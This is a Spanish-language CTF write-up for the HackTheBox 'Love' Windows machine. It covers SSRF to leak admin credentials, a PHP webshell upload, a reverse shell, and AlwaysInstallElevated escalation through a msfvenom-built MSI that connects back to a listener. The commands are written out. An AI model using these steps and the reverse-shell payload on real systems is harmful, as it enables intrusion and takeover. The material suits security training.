+++ 
draft = false
date = 2025-11-24T19:39:22Z
title = "Love Machine - HackTheBox"
description = "Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Machine #Windows #Easy
----------------
# Enumeración
Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.239 -oG allPorts
```
<img src="/images/Pasted image 20251108011547.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que en el puerto 443 que corresponde al servicio HTTPS, nos muestra información sobre un subdominio llamado `staging.love.htb`

<img src="/images/Pasted image 20251108011952.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto procederemos a agregar el dominio y subdominio a nuestro `/etc/hosts`

<img src="/images/Pasted image 20251108181655.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración HTTP

Primeramente corremos el script de nmap `http-enum` para realizar un fuzzeo rápido

```bash
nmap -p80 --script http-enum 10.10.10.239
```
Encontrando los siguientes directorios:

<img src="/images/Pasted image 20251108181835.png" style="width:100%; height:auto; display:block; margin:auto;">

Además vemos el puerto 5000 que corre el servicio `http` y el puerto 80.
Enumerando el puerto 5000 vemos que solo tenemos una página que nos muestra el código 403, es decir que no estamos autorizados a ver el contenido

<img src="/images/Pasted image 20251108012305.png" style="width:100%; height:auto; display:block; margin:auto;">

En el puerto 80 probaremos el dominio `love.htb`, el cual contiene un login que nos pide ID

<img src="/images/Pasted image 20251108181949.png" style="width:100%; height:auto; display:block; margin:auto;">

y en la ruta  `love.htb/admin/index.php` encontramos otro login de administrador, que nos pide usuarios

<img src="/images/Pasted image 20251108182020.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora analizando el subdominio `staging.love.htb` tenemos una herramienta que nos permite escanear archivos

<img src="/images/Pasted image 20251108182148.png" style="width:100%; height:auto; display:block; margin:auto;">

En la ruta `http://staging.love.htb/beta.php` nos da la opción de poner algún url

<img src="/images/Pasted image 20251108182216.png" style="width:100%; height:auto; display:block; margin:auto;">

Como nos permite usar url probaremos realizar un SSRF, poniendo `http://localhost` vemos que carga la página del puerto 80 `love.htb`

<img src="/images/Pasted image 20251108182320.png" style="width:100%; height:auto; display:block; margin:auto;">

Como vimos en el escaneo inicial que el puerto 5000 está corriendo el servicio `HTTP` probamos ver si hay alguna información relevante, y obtenemos las credenciales de administrador `admin:@LoveIsInTheAir!!!!`

<img src="/images/Pasted image 20251108182545.png" style="width:100%; height:auto; display:block; margin:auto;">

Utilizamos las credenciales en `http://love.htb/admin/index.php` y entramos al dashboard de admin

<img src="/images/Pasted image 20251108182700.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotación de VotingSystem

Buscando por vulnerabilidades de `VotingSystem` en la web, nos encontramos con lo siguiente

<img src="/images/Pasted image 20251108182814.png" style="width:100%; height:auto; display:block; margin:auto;">

Viendo el payload tenemos lo siguiente

<img src="/images/Pasted image 20251108182836.png" style="width:100%; height:auto; display:block; margin:auto;">

Se ve una petición POST hacia `/admin/candidates_add.php`, y que el código malicioso se inserta en un archivo subido llamado "photo"

En el dashboard existe el botón de `candidates`

<img src="/images/Pasted image 20251108183019.png" style="width:100%; height:auto; display:block; margin:auto;">

Al agregar un candidato nos pide crear una `Position`

<img src="/images/Pasted image 20251108183041.png" style="width:100%; height:auto; display:block; margin:auto;">

Y el campo de position también está en el dashboard, lo creamos

<img src="/images/Pasted image 20251108183107.png" style="width:100%; height:auto; display:block; margin:auto;">

Y ahora llenamos los campos, subiendo una imagen cualquiera

<img src="/images/Pasted image 20251108183151.png" style="width:100%; height:auto; display:block; margin:auto;">

Interceptamos la petición con `burpsuite` y agregamos la siguiente webshell

<img src="/images/Pasted image 20251108183347.png" style="width:100%; height:auto; display:block; margin:auto;">

Quedando la petición de la siguiente forma, cambiando la extensión del `filename=` a `.php`

<img src="/images/Pasted image 20251108183419.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que en la web se ve la foto con un error

<img src="/images/Pasted image 20251108183505.png" style="width:100%; height:auto; display:block; margin:auto;">

Inspeccionando la foto encontramos la ruta `images/gato.php`

<img src="/images/Pasted image 20251108183549.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora usamos el parametro cmd para usar algun comando de la siguiente forma `http://love.htb/images/gato.php?cmd=whoami`

<img src="/images/Pasted image 20251108183628.png" style="width:100%; height:auto; display:block; margin:auto;">

En `https://www.revshells.com/` buscamos una reverse shell en powershell encoded en base64

<img src="/images/Pasted image 20251108183733.png" style="width:100%; height:auto; display:block; margin:auto;">

Nos ponemos en escucha

<img src="/images/Pasted image 20251108183811.png" style="width:100%; height:auto; display:block; margin:auto;">

y mandamos el codigo de powershell

<img src="/images/Pasted image 20251108183833.png" style="width:100%; height:auto; display:block; margin:auto;">

Obteniendo la shell

<img src="/images/Pasted image 20251108183853.png" style="width:100%; height:auto; display:block; margin:auto;">

Obtenemos la flag de usuario

<img src="/images/Pasted image 20251108190313.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Utilizaremos la herramienta `Winpeas` para buscar formas de escalar privilegios en windows, del siguiente link de github `https://github.com/peass-ng/PEASS-ng/releases/tag/20251101-a416400b`

Descargamos la versión `WinPEASx64.exe`

<img src="/images/Pasted image 20251108190614.png" style="width:100%; height:auto; display:block; margin:auto;">

Para descargarlo usaremos wget

<img src="/images/Pasted image 20251108190703.png" style="width:100%; height:auto; display:block; margin:auto;">

Corremos el script con el siguiente comando, el script si no muestra nada mientras carga debemos esperar

```powershell
./winPEASx64.exe
```

Encontramos una forma de escalar privilegios

<img src="/images/Pasted image 20251108192234.png" style="width:100%; height:auto; display:block; margin:auto;">

Tenemos los parámetros 

```powershell
AlwaysInstallElevated set to 1 in HKLM!
AlwaysInstallElevated set to 1 in HKCU!
```

Si vemos el link que nos recomiendan en hacktricks `https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated`
Nos dice que podemos ejecutar archivos `.msi` como administrator

<img src="/images/Pasted image 20251108192356.png" style="width:100%; height:auto; display:block; margin:auto;">

y nos dan un script que permite agregar un usuario

<img src="/images/Pasted image 20251108192442.png" style="width:100%; height:auto; display:block; margin:auto;">

Pero nosotros crearemos una reverse shell con `msfvenom` y se ejecutará como `administrator`, dandonos la shell con ese privilegio. Utilizaremos el siguiente comando

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f msi -o reverse.msi
```

<img src="/images/Pasted image 20251108192826.png" style="width:100%; height:auto; display:block; margin:auto;">

Compartimos el archivo con un servidor web, y nos ponemos en escucha en el puerto 4444

<img src="/images/Pasted image 20251108192907.png" style="width:100%; height:auto; display:block; margin:auto;">

y en la máquina víctima descargamos el archivo con wget

<img src="/images/Pasted image 20251108193002.png" style="width:100%; height:auto; display:block; margin:auto;">

Para correr nuestro `reverse.msi` utilizaremos el siguiente comando

```powershell
msiexec /quiet /i reverse.msi
```

Y obtenemos la consola como administrator

<img src="/images/Pasted image 20251108193111.png" style="width:100%; height:auto; display:block; margin:auto;">

Y obtenemos la flag de root.txt

<img src="/images/Pasted image 20251108193141.png" style="width:100%; height:auto; display:block; margin:auto;">
